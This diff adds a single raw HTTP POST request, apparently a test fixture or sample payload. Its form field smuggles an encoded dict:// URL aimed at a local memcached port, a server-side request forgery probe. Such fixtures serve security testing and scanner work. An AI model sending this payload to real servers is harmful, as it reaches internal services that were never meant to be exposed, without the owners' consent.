@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+Connection: close
+
+file=dict%3A%2F%2F127.0.0.1%3A11211%2Fstat
